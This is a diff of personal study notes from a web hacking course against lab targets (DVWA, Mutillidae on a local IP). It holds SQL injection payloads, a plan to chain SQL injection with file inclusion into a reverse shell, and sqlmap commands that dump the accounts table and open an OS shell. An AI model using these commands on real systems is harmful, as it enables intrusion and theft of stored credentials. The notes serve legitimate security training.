@@ -605,10 +605,10 @@ outfile '/tmp/example.txt'%23&password=adminpass&user-info-php-submit-button=Vie
 // now in the best case scenerio u will be able to write into webroot which means u will be able to access the file through the
 browser and execute it so u can upload a weevely file and then connect to it
 
-- Getting a reverse shell and gaining control using SQL Injection ->
-- the problem is we weren't able to write stuff to the web directories so we can't actually read the stuff using the URL so for that
-part we need to work on the same web server, So if one of website on the same web server has the sql injection and the other website
-has the local file inclusion we can combine use of them and get a shell
+Step 19 -> Getting a reverse shell and gaining control using SQL Injection -
+- the problem is we weren't able to write stuff to the web directories so we can't actually read the stuff using the URL so for 
+that part we need to work on the same web server, So if one of website on the same web server has the sql injection and the
+other website has the local file inclusion we can combine use of them and get a shell
 
 - Go to dvwa and set security to low
 - statement ->1' union select 1,2 %23 put it inside the text box
@@ -632,8 +632,8 @@ browse to this file just like going to 10.0.2.4/dvwa/reverse.php but we don't ha
 
 - So it is better to found a writable place to the server
 
-SQLmap -> this tool can help us to all the sql attacks we have done so far and even more, it is used against mysql databases, even
-against, microsoft sql , oracle and other database types
+Step 20 -> SQLmap - this tool can help us to all the sql attacks we have done so far and even more, it is used against mysql
+databases, even against, microsoft sql , oracle and other database types. Screenshot(474)
 Steps -> get the URL which we r using for the injection which is->
 http://10.0.2.4/mutillidae/index.php?page=user-info.php&username=admin&password=put_any_password&user-info-php-submit-but........
 // here we r using any password as we currently don't know the password
@@ -660,7 +660,7 @@ sqlmap -u "paste_above_url" --columns -T accounts -D owasp10 // to get columns a
 all columns
 sqlmap -u "paste_above_url" -T accounts -D owasp10 --dump // --dump to get the data and we get all the data
 
-- Get Direct SQL Shell using sqlmap
+Step 21 - Get Direct SQL Shell using sqlmap ->
 SQL map also allows u to get different types of shells on the target server so we can try to get an OS shell
 sqlmap -u "paste_above_url" --os-shell // in this case we cann't actually uplaod the files to the server so it is asking which
 language the server is using
